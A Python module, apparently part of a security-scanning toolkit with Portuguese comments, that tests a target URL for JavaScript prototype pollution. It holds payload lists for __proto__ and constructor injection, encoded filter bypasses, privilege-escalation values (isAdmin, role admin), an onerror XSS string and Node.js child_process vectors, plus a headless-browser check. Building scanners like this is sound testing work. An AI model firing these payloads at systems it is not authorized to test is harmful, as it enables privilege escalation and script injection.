#!/usr/bin/env python3
"""Modulo de deteccao de Prototype Pollution.

Testa se o servidor e vulneravel a prototype pollution via:
  - __proto__ — injecao direta em prototypes de objetos JS
  - constructor.prototype — via construtor de objetos
  - bypass — encoding e variantes para contornar filtros
  - blind — detecao cega via timing/reflection
  - impact — teste de impacto concreto (isAdmin, role, settings)
  - dom — DOM-based pollution via URL params, hash, JSON.parse sinks
  - library — vetores especificos (jQuery, Lodash, Vue, Node.js)

Fluxo:
  1. Envia payloads de prototype pollution em parametros de entrada
  2. Verifica se a resposta indica prototype modificado
  3. Se detectado, testa impacto concreto
  4. Classifica: detectado, blocked, error

  Nota sobre DOM-based: Sem --callback-url, so detecta se a poluicao
  alterar a resposta HTTP (caso raro). Com --callback-url, usa deteccao
  out-of-band para confirmar poluicao real no browser/servidor.
"""

import argparse
import logging
import time
from dataclasses import asdict, dataclass
from typing import Any, cast
from urllib.parse import urlencode, urlparse, urlunparse

import httpx

from mytools.core.base import BaseScanner, ScanGroup
from mytools.core.utils import (
    Cyber,
    color,
    create_async_client,
    create_banner,
    print_exploit_info,
    write_output,
)

logger = logging.getLogger("mytools.prototypepollution")


_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
    "detect": [
        "proto_basic",
        "proto_admin",
        "proto_role",
        "proto_settings",
        "proto_version",
    ],
    "constructor": [
        "ctor_basic",
        "ctor_admin",
        "ctor_role",
        "ctor_proto",
        "ctor_inject",
    ],
    "bypass": [
        "url_encode",
        "double_encode",
        "nested",
        "array_bracket",
        "dot_notation",
    ],
    "blind": [
        "blind_timing",
        "blind_reflection",
        "blind_stored",
        "blind_header",
        "blind_cookie",
    ],
    "impact": [
        "impact_isadmin",
        "impact_role",
        "impact_settings",
        "impact_rce",
        "impact_xss",
    ],
    "dom": [
        "dom_url_param",
        "dom_hash",
        "dom_json_parse",
        "dom_referrer",
        "dom_window_name",
        "dom_merge",
        "dom_array",
        "dom_nested",
        "dom_bracket",
        "dom_cookie",
    ],
    "library": [
        "jquery_extend",
        "lodash_merge",
        "vue_reactive",
        "angular_scope",
        "node_require",
        "node_fs",
        "node_process",
        "node_eval",
    ],
}


def _load_category_map():
    from mytools.data import load_payloads

    data = load_payloads(
        "web", "prototypepollution", default={"category_map": _CATEGORY_MAP_DEFAULT}
    )
    return data.get("category_map", _CATEGORY_MAP_DEFAULT)


_CATEGORY_MAP = _load_category_map()


_DETECT_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "proto_basic",
        '{"__proto__":{"polluted":true}}',
        ["polluted", "true", "__proto__"],
    ),
    (
        "proto_admin",
        '{"__proto__":{"isAdmin":true}}',
        ["isAdmin", "true", "admin"],
    ),
    (
        "proto_role",
        '{"__proto__":{"role":"admin"}}',
        ["role", "admin"],
    ),
    (
        "proto_settings",
        '{"__proto__":{"settings":{"debug":true}}}',
        ["settings", "debug", "true"],
    ),
    (
        "proto_version",
        '{"__proto__":{"version":"9.9.9"}}',
        ["version", "9.9.9"],
    ),
]


def _load_detect_payloads():
    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "prototypepollution",
        default={"detect_payloads": _DETECT_PAYLOADS_DEFAULT},
    )
    return [tuple(x) for x in data.get("detect_payloads", _DETECT_PAYLOADS_DEFAULT)]


_DETECT_PAYLOADS = _load_detect_payloads()


_CONSTRUCTOR_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "ctor_basic",
        '{"constructor":{"prototype":{"polluted":true}}}',
        ["polluted", "true", "prototype"],
    ),
    (
        "ctor_admin",
        '{"constructor":{"prototype":{"isAdmin":true}}}',
        ["isAdmin", "true"],
    ),
    (
        "ctor_role",
        '{"constructor":{"prototype":{"role":"admin"}}}',
        ["role", "admin"],
    ),
    (
        "ctor_proto",
        '{"constructor":{"prototype":{"__proto__":{"polluted":true}}}}',
        ["polluted", "true", "__proto__"],
    ),
    (
        "ctor_inject",
        '{"constructor":{"prototype":{"toString":"polluted"}}}',
        ["toString", "polluted"],
    ),
]


def _load_constructor_payloads():
    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "prototypepollution",
        default={"constructor_payloads": _CONSTRUCTOR_PAYLOADS_DEFAULT},
    )
    return [
        tuple(x)
        for x in data.get("constructor_payloads", _CONSTRUCTOR_PAYLOADS_DEFAULT)
    ]


_CONSTRUCTOR_PAYLOADS = _load_constructor_payloads()


_BYPASS_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "url_encode",
        "%5B__proto__%5D%5Bpolluted%5D=true",
        ["polluted", "true", "__proto__"],
    ),
    (
        "double_encode",
        "%255B__proto__%255D%255Bpolluted%255D=true",
        ["polluted", "true", "__proto__"],
    ),
    (
        "nested",
        '{"__proto__":{"__proto__":{"polluted":true}}}',
        ["polluted", "true", "__proto__"],
    ),
    (
        "array_bracket",
        "__proto__[polluted]=true",
        ["polluted", "true", "__proto__"],
    ),
    (
        "dot_notation",
        "__proto__.polluted=true",
        ["polluted", "true", "__proto__"],
    ),
]


def _load_bypass_payloads():
    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "prototypepollution",
        default={"bypass_payloads": _BYPASS_PAYLOADS_DEFAULT},
    )
    return [tuple(x) for x in data.get("bypass_payloads", _BYPASS_PAYLOADS_DEFAULT)]


_BYPASS_PAYLOADS = _load_bypass_payloads()


_BLIND_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "blind_timing",
        '{"__proto__":{"timeout":999999}}',
        "timeout",
        ["timeout", "999999"],
    ),
    (
        "blind_reflection",
        '{"__proto__":{"reflected":"PP_TEST_7X9K2"}}',
        "PP_TEST_7X9K2",
        ["PP_TEST_7X9K2"],
    ),
    (
        "blind_stored",
        '{"__proto__":{"stored":"PP_STORED_3M8N5"}}',
        "stored",
        ["PP_STORED_3M8N5"],
    ),
    (
        "blind_header",
        '{"__proto__":{"x-custom-header":"PP_HDR_4L6P1"}}',
        "x-custom-header",
        ["PP_HDR_4L6P1"],
    ),
    (
        "blind_cookie",
        '{"__proto__":{"session":"PP_SESS_2K7W9"}}',
        "session",
        ["PP_SESS_2K7W9"],
    ),
]


def _load_blind_payloads():
    from mytools.data import load_payloads

    data = load_payloads(
        "web", "prototypepollution", default={"blind_payloads": _BLIND_PAYLOADS_DEFAULT}
    )
    return [tuple(x) for x in data.get("blind_payloads", _BLIND_PAYLOADS_DEFAULT)]


_BLIND_PAYLOADS = _load_blind_payloads()


_IMPACT_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "impact_isadmin",
        '{"__proto__":{"isAdmin":true}}',
        ["isAdmin", "true", "admin", "authorized"],
    ),
    (
        "impact_role",
        '{"__proto__":{"role":"admin"}}',
        ["role", "admin", "administrator"],
    ),
    (
        "impact_settings",
        '{"__proto__":{"settings":{"debug":true,"admin":true}}}',
        ["settings", "debug", "admin", "true"],
    ),
    (
        "impact_rce",
        '{"__proto__":{"child_process":{}}}',
        ["child_process", "exec", "spawn"],
    ),
    (
        "impact_xss",
        '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
        ["innerHTML", "alert", "onerror"],
    ),
]


def _load_impact_payloads():
    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "prototypepollution",
        default={"impact_payloads": _IMPACT_PAYLOADS_DEFAULT},
    )
    return [tuple(x) for x in data.get("impact_payloads", _IMPACT_PAYLOADS_DEFAULT)]


_IMPACT_PAYLOADS = _load_impact_payloads()


_DOM_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "dom_url_param",
        '{"__proto__":{"polluted":"PP_DOM_URL"}}',
        ["polluted", "PP_DOM_URL"],
    ),
    (
        "dom_hash",
        '{"__proto__":{"polluted":"PP_DOM_HASH"}}',
        ["polluted", "PP_DOM_HASH"],
    ),
    (
        "dom_json_parse",
        '{"__proto__":{"polluted":"PP_DOM_JSON"}}',
        ["polluted", "PP_DOM_JSON"],
    ),
    (
        "dom_referrer",
        '{"__proto__":{"isAdmin":"PP_DOM_REF"}}',
        ["isAdmin", "PP_DOM_REF"],
    ),
    (
        "dom_window_name",
        '{"__proto__":{"polluted":"PP_DOM_WIN"}}',
        ["polluted", "PP_DOM_WIN"],
    ),
    (
        "dom_merge",
        '{"__proto__":{"polluted":"PP_DOM_MERGE"}}',
        ["polluted", "PP_DOM_MERGE"],
    ),
    (
        "dom_array",
        '[{"__proto__":{"polluted":"PP_DOM_ARR"}}]',
        ["polluted", "PP_DOM_ARR"],
    ),
    (
        "dom_nested",
        '{"a":{"__proto__":{"polluted":"PP_DOM_NEST"}}}',
        ["polluted", "PP_DOM_NEST"],
    ),
    (
        "dom_bracket",
        '{"__proto__":{"polluted":"PP_DOM_BRK"}}',
        ["polluted", "PP_DOM_BRK"],
    ),
    ("dom_cookie", '{"__proto__":{"polluted":"PP_DOM_CK"}}', ["polluted", "PP_DOM_CK"]),
]


def _load_dom_payloads():
    from mytools.data import load_payloads

    data = load_payloads(
        "web", "prototypepollution", default={"dom_payloads": _DOM_PAYLOADS_DEFAULT}
    )
    return [tuple(x) for x in data.get("dom_payloads", _DOM_PAYLOADS_DEFAULT)]


_DOM_PAYLOADS = _load_dom_payloads()


_LIBRARY_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "jquery_extend",
        '{"__proto__":{"polluted":"PP_JQUERY"}}',
        ["polluted", "PP_JQUERY"],
    ),
    (
        "lodash_merge",
        '{"__proto__":{"polluted":"PP_LODASH"}}',
        ["polluted", "PP_LODASH"],
    ),
    ("vue_reactive", '{"__proto__":{"$polluted":"PP_VUE"}}', ["$polluted", "PP_VUE"]),
    (
        "angular_scope",
        '{"__proto__":{"$$hashKey":"PP_ANGULAR"}}',
        ["$$hashKey", "PP_ANGULAR"],
    ),
    ("node_require", '{"__proto__":{"child_process":{}}}', ["child_process"]),
    ("node_fs", '{"__proto__":{"fs":{}}}', ["fs"]),
    ("node_process", '{"__proto__":{"process":{"env":{}}}}', ["process", "env"]),
    ("node_eval", '{"__proto__":{"eval":"PP_NODE_EVAL"}}', ["eval", "PP_NODE_EVAL"]),
]


def _load_library_payloads():
    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "prototypepollution",
        default={"library_payloads": _LIBRARY_PAYLOADS_DEFAULT},
    )
    return [tuple(x) for x in data.get("library_payloads", _LIBRARY_PAYLOADS_DEFAULT)]


_LIBRARY_PAYLOADS = _load_library_payloads()


_SSI_PARAMS_DEFAULT: list[str] = [
    "data",
    "json",
    "payload",
    "input",
    "value",
    "content",
    "body",
    "params",
    "query",
    "config",
    "options",
    "settings",
    "item",
    "object",
    "model",
]


def _load_ssi_params():
    from mytools.data import load_payloads

    data = load_payloads(
        "web", "prototypepollution", default={"ssi_params": _SSI_PARAMS_DEFAULT}
    )
    return data.get("ssi_params", _SSI_PARAMS_DEFAULT)


_SSI_PARAMS = _load_ssi_params()


@dataclass(frozen=True, slots=True)
class PollAttempt:
    """Tentativa individual de Prototype Pollution."""

    technique: str

    category: str

    payload: str

    param: str

    method: str

    status_baseline: int

    status_test: int

    size_baseline: int

    size_test: int

    status_changed: bool

    size_changed: bool

    vulnerable: bool

    details: str

    error: str

    exploit: str = ""

    tool: str = ""

    test_url: str = ""

    dom_confirmed: bool = False


@dataclass(frozen=True, slots=True)
class PollResult:
    """Resultado consolidado do scan de Prototype Pollution."""

    target: str

    baseline_status: int

    baseline_size: int

    tls: bool

    attempts: list[PollAttempt]

    vulnerable_techniques: list[str]

    blocked_techniques: list[str]

    issues: list[str]

    overall_status: str


def _check_poll_response(body: bytes, status: int, indicators: list[str]) -> bool:
    """Verifica se a resposta indica prototype pollution."""

    if status == 0:
        return False

    text = body.decode("utf-8", errors="ignore").lower()

    return any(ind.lower() in text for ind in indicators)


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia request baseline para obter tamanho e status de referencia."""

    try:
        resp = await client.get(url, follow_redirects=True)

        return resp.status_code, len(resp.content), resp.content

    except httpx.RequestError:
        return 0, 0, b""


async def _test_detect(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[PollAttempt]:
    """Testa payloads de deteccao de prototype pollution.



    LIMITACAO: Este teste apenas verifica reflexao do payload na resposta,

    nao prototype pollution real. Pollution real requer teste bifasico:

    (1) enviar payload de pollution, (2) fazer request follow-up para

    verificar se Object.prototype foi modificado no servidor.

    Atualmente pode produzir falsos positivos por reflexao de input.

    """

    b_status, b_size, _ = baseline

    results: list[PollAttempt] = []

    for technique, payload, indicators in _DETECT_PAYLOADS:
        for param in _SSI_PARAMS[:4]:
            try:
                json_data = {param: payload}

                resp = await client.post(url, json=json_data, follow_redirects=True)

                vulnerable = _check_poll_response(
                    resp.content, resp.status_code, indicators
                )

                results.append(
                    PollAttempt(
                        technique=technique,
                        category="detect",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"param={param}, indicators={indicators}"
                        if vulnerable
                        else "",
                        error="",
                        exploit="__proto__[isAdmin]=true" if vulnerable else "",
                        tool="curl",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    PollAttempt(
                        technique=technique,
                        category="detect",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_constructor(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[PollAttempt]:
    """Testa payloads de constructor prototype pollution."""

    b_status, b_size, _ = baseline

    results: list[PollAttempt] = []

    for technique, payload, indicators in _CONSTRUCTOR_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                json_data = {param: payload}

                resp = await client.post(url, json=json_data, follow_redirects=True)

                vulnerable = _check_poll_response(
                    resp.content, resp.status_code, indicators
                )

                results.append(
                    PollAttempt(
                        technique=technique,
                        category="constructor",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"param={param}, indicators={indicators}"
                        if vulnerable
                        else "",
                        error="",
                        exploit="__proto__[isAdmin]=true" if vulnerable else "",
                        tool="curl",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    PollAttempt(
                        technique=technique,
                        category="constructor",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_bypass(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[PollAttempt]:
    """Testa payloads de bypass de filtros."""

    b_status, b_size, _ = baseline

    results: list[PollAttempt] = []

    for technique, payload, indicators in _BYPASS_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                json_data = {param: payload}

                resp = await client.post(url, json=json_data, follow_redirects=True)

                vulnerable = _check_poll_response(
                    resp.content, resp.status_code, indicators
                )

                results.append(
                    PollAttempt(
                        technique=technique,
                        category="bypass",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"param={param}, indicators={indicators}"
                        if vulnerable
                        else "",
                        error="",
                        exploit="__proto__[isAdmin]=true" if vulnerable else "",
                        tool="curl",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    PollAttempt(
                        technique=technique,
                        category="bypass",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_blind(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[PollAttempt]:
    """Testa payloads de detecção cega (timing, reflection)."""

    b_status, b_size, _ = baseline

    results: list[PollAttempt] = []

    for technique, payload, _field, indicators in _BLIND_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                if technique == "blind_timing":
                    t0 = time.monotonic()

                    resp = await client.post(
                        url, json={param: payload}, follow_redirects=True
                    )

                    elapsed = time.monotonic() - t0

                    vulnerable = elapsed > 2.0

                else:
                    resp = await client.post(
                        url, json={param: payload}, follow_redirects=True
                    )

                    vulnerable = _check_poll_response(
                        resp.content, resp.status_code, indicators
                    )

                results.append(
                    PollAttempt(
                        technique=technique,
                        category="blind",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"param={param}, indicators={indicators}"
                        if vulnerable
                        else "",
                        error="",
                        exploit="__proto__[isAdmin]=true" if vulnerable else "",
                        tool="curl",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    PollAttempt(
                        technique=technique,
                        category="blind",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_impact(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[PollAttempt]:
    """Testa impacto concreto de prototype pollution."""

    b_status, b_size, _ = baseline

    results: list[PollAttempt] = []

    for technique, payload, indicators in _IMPACT_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                json_data = {param: payload}

                resp = await client.post(url, json=json_data, follow_redirects=True)

                vulnerable = _check_poll_response(
                    resp.content, resp.status_code, indicators
                )

                results.append(
                    PollAttempt(
                        technique=technique,
                        category="impact",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"param={param}, indicators={indicators}"
                        if vulnerable
                        else "",
                        error="",
                        exploit="__proto__[isAdmin]=true" if vulnerable else "",
                        tool="curl",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    PollAttempt(
                        technique=technique,
                        category="impact",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_dom(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[PollAttempt]:
    """Testa DOM-based prototype pollution (URL params, hash, JSON.parse).

    Limitacao: Sem --callback-url, so detecta se a poluicao alterar a

    resposta HTTP. Com --callback-url, usa deteccao out-of-band.

    """

    b_status, b_size, _ = baseline

    results: list[PollAttempt] = []

    for technique, payload, indicators in _DOM_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                json_data = {param: payload}

                resp = await client.post(url, json=json_data, follow_redirects=True)

                vulnerable = _check_poll_response(
                    resp.content, resp.status_code, indicators
                )

                results.append(
                    PollAttempt(
                        technique=technique,
                        category="dom",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"DOM vector: param={param}" if vulnerable else "",
                        error="",
                        exploit="?__proto__[key]=value" if vulnerable else "",
                        tool="curl",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    PollAttempt(
                        technique=technique,
                        category="dom",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_library(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[PollAttempt]:
    """Testa vetores de pollution especificos de bibliotecas.

    jQuery: $.extend(true, ...) merge profundo

    Lodash: _.merge() merge profundo

    Vue.js: reatividade via __proto__

    Angular: scope via __proto__

    Node.js: child_process, fs, process (server-side)

    """

    b_status, b_size, _ = baseline

    results: list[PollAttempt] = []

    for technique, payload, indicators in _LIBRARY_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                json_data = {param: payload}

                resp = await client.post(url, json=json_data, follow_redirects=True)

                vulnerable = _check_poll_response(
                    resp.content, resp.status_code, indicators
                )

                results.append(
                    PollAttempt(
                        technique=technique,
                        category="library",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"Library vector: {technique}" if vulnerable else "",
                        error="",
                        exploit='{"__proto__":{"key":"value"}}' if vulnerable else "",
                        tool="curl",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    PollAttempt(
                        technique=technique,
                        category="library",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


def print_results(result: PollResult) -> None:
    """Exibe os resultados do scan de Prototype Pollution."""

    vuln = [a for a in result.attempts if a.vulnerable]

    blocked = [a for a in result.attempts if a.error and "403" in a.error]

    if vuln:
        print(color("\n[!] VULNERABILIDADES DETECTADAS:", Cyber.RED, Cyber.BOLD))

        for v in vuln:
            print(color(f"  [!] {v.technique} via {v.param}", Cyber.RED))

            print(f"      Payload: {v.payload[:80]}...")

            if v.details:
                print(f"      Detalhes: {v.details}")

            if v.dom_confirmed:
                print(color("      DOM:       confirmado via headless", Cyber.GREEN))

            print_exploit_info(v.exploit, v.tool)

    else:
        print(
            color(
                "\n  [+] Nenhuma Prototype Pollution detectada", Cyber.GREEN, Cyber.BOLD
            )
        )

    if blocked:
        print(
            color(f"\n  [*] {len(blocked)} payloads bloqueados (403/429)", Cyber.YELLOW)
        )

    errors = [a for a in result.attempts if a.error and "403" not in a.error]

    if errors:
        print(color(f"\n  [-] {len(errors)} erros de conexao", Cyber.GRAY))

    print(
        color(
            f"\n  Total: {len(result.attempts)} testes, {len(vuln)} vulneraveis",
            Cyber.WHITE,
        )
    )


# Script avaliado no browser: retorna True se Object.prototype.polluted
# foi setado (DOM-based prototype pollution real, independente de reflexo HTTP).
_PP_DOM_CONFIRM_SCRIPT = """
(marker) => {
  try {
    const v = Object.prototype.polluted;
    return v !== undefined && v !== null && String(v).indexOf(marker) !== -1;
  } catch (e) { return false; }
}
"""


async def _test_dom_client_side(
    target: str,
    timeout: float,
    proxy: str | None,
    b_status: int,
    b_size: int,
) -> list[PollAttempt]:
    """Detecta DOM-based prototype pollution real via browser headless.

    Injeta `?__proto__[polluted]=<marker>` na URL e renderiza no chromium;
    se Object.prototype.polluted ficar setado, e poluicao client-side de
    verdade (que o scan HTTP por reflexo nao captura).

    """
    from mytools.core.headless import evaluate

    attempts: list[PollAttempt] = []

    for idx, param in enumerate(_SSI_PARAMS[:3]):
        marker = f"PP_DOM_HL{idx}_{param}"
        parsed = urlparse(target)
        existing = parsed.query
        sep = "&" if existing else ""
        new_query = urlencode({"__proto__[polluted]": marker})
        test_url = urlunparse(parsed._replace(query=existing + sep + new_query))
        try:
            poisoned = await evaluate(
                test_url,
                _PP_DOM_CONFIRM_SCRIPT,
                marker,
                timeout=timeout,
                proxy=proxy,
            )
        except Exception as e:
            logger.debug("headless dom falhou para %s: %s", test_url, e)
            poisoned = False
        vulnerable = bool(poisoned)
        attempts.append(
            PollAttempt(
                technique="dom_client_side",
                category="dom",
                payload=f'{{"__proto__":{{"polluted":"{marker}"}}}}',
                param=param,
                method="get_url",
                status_baseline=b_status,
                status_test=b_status,
                size_baseline=b_size,
                size_test=b_size,
                status_changed=False,
                size_changed=False,
                vulnerable=vulnerable,
                details=(
                    "Object.prototype.polluted setado via ?__proto__[polluted]"
                    if vulnerable
                    else ""
                ),
                error="browser nao poluiu" if not vulnerable else "",
                exploit="?__proto__[polluted]=value" if vulnerable else "",
                tool="playwright",
                test_url=test_url,
                dom_confirmed=vulnerable,
            )
        )
        if vulnerable:
            break

    return attempts


async def _run_scan_core(
    target: str,
    categories: list[str],
    timeout: float,
    output_file: str | None,
    headless: bool = False,
    proxy: str | None = None,
) -> int:
    """Executa o scan de Prototype Pollution."""

    logger.info("Prototype Pollution scan para %s", target)

    if headless:
        from mytools.core.headless import browser_available

        if not browser_available():
            print(
                color(
                    "Erro: --headless requer chromium. Rode: uv run playwright install chromium",
                    Cyber.RED,
                )
            )
            return 1

    async with create_async_client(timeout=timeout) as client:
        b_status, b_size, _ = await _test_baseline(client, target)

        if b_status == 0:
            print(color("[-] Nao foi possivel conectar ao alvo", Cyber.RED))

            return 1

        print(color(f"[*] Baseline: status={b_status}, size={b_size}", Cyber.CYAN))

        test_categories = categories if categories else list(_CATEGORY_MAP.keys())

        all_attempts: list[PollAttempt] = []

        for cat in test_categories:
            if cat == "detect":
                attempts = await _test_detect(client, target, (b_status, b_size, b""))

            elif cat == "constructor":
                attempts = await _test_constructor(
                    client, target, (b_status, b_size, b"")
                )

            elif cat == "bypass":
                attempts = await _test_bypass(client, target, (b_status, b_size, b""))

            elif cat == "blind":
                attempts = await _test_blind(client, target, (b_status, b_size, b""))

            elif cat == "impact":
                attempts = await _test_impact(client, target, (b_status, b_size, b""))

            elif cat == "dom":
                attempts = await _test_dom(client, target, (b_status, b_size, b""))

            elif cat == "library":
                attempts = await _test_library(client, target, (b_status, b_size, b""))

            else:
                continue

            all_attempts.extend(attempts)

        if headless:
            dom_attempts = await _test_dom_client_side(
                target, timeout, proxy, b_status, b_size
            )
            all_attempts.extend(dom_attempts)

        vulnerable = [a for a in all_attempts if a.vulnerable]

        blocked = [a for a in all_attempts if a.error and "403" in a.error]

        issues = [f"VULN: {a.technique} via {a.param}" for a in vulnerable]

        result = PollResult(
            target=target,
            baseline_status=b_status,
            baseline_size=b_size,
            tls=target.startswith("https"),
            attempts=all_attempts,
            vulnerable_techniques=[a.technique for a in vulnerable],
            blocked_techniques=[a.technique for a in blocked],
            issues=issues,
            overall_status="vulnerable" if vulnerable else "secure",
        )

        print_results(result)

        if output_file:
            write_output(output_file, asdict(result))

            logger.info("Resultados salvos em %s", output_file)

        return 1 if vulnerable else 0


def banner_art() -> None:
    """Exibe a banner do modulo."""

    art = r"""

   ___  ___  ___   __  __            _     _                         _

  / _ \ / _ \|__  |  \/  | ___  _ __| |__ (_)_ __   __ _    ___ _ __ | |_

 | | | | | | | / /| |\/| |/ _ \| '__| '_ \| | '_ \ / _` |  / _ \ '_ \| __|

 | |_| | |_| |/ / | |  | | (_) | |  | |_) | | | | | (_| | |  __/ | | | |_

  \___/ \___/____/  |_|  |_|\___/|_|  |_.__/|_|_| |_|\__, |  \___|_| |_|\__|

                                                       |___/

"""

    create_banner(art, "   prototype pollution: detect __proto__ injection")()


class PrototypePollutionScanner(BaseScanner):
    """Scanner de Prototype Pollution (Group A)."""

    prog = "mytools-protopoll"
    description = "Prototype Pollution — detecta injecao em prototypes de objetos JS"
    prompt = "protopoll> "
    module_name = "mytools.prototypepollution"
    banner_fn = banner_art
    group = ScanGroup.A

    def _add_arguments(self, parser: argparse.ArgumentParser) -> None:
        parser.add_argument("url", nargs="?", help="URL alvo (ex: https://example.com)")
        parser.add_argument(
            "-c",
            "--category",
            choices=list(_CATEGORY_MAP.keys()),
            help="Categoria de testes (default: todas)",
        )
        parser.add_argument(
            "--concurrency",
            type=int,
            default=5,
            help="Requisicoes simultaneas (default: 5)",
        )
        parser.add_argument(
            "--callback-url",
            dest="callback_url",
            help="URL de callback para deteccao out-of-band (opcional)",
        )
        parser.add_argument(
            "--headless",
            action="store_true",
            help="Detecta DOM-based pollution executando JS real (requer 'uv run playwright install chromium').",
        )

    async def run_scan(self, **kwargs: Any) -> int:
        return await _run_scan_core(
            target=kwargs.get("target", ""),
            categories=kwargs.get("categories", []),
            timeout=kwargs.get("timeout", 10.0),
            output_file=kwargs.get("output_file"),
            headless=kwargs.get("headless", False),
            proxy=kwargs.get("proxy"),
        )

    def print_results(self, result: object) -> None:
        print_results(cast(PollResult, result))

    def _example(self) -> str:
        return "https://target.com -c detect"

    def _help(self) -> str:
        return (
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c detect\n"
            "  https://target.com -c constructor\n"
            "  https://target.com -c bypass --proxy http://127.0.0.1:8080\n"
            "  https://target.com --headless"
        )


scanner = PrototypePollutionScanner()
main = scanner.main
run_once = scanner.run_once
banner_art = scanner._make_banner()
build_parser = scanner.build_parser

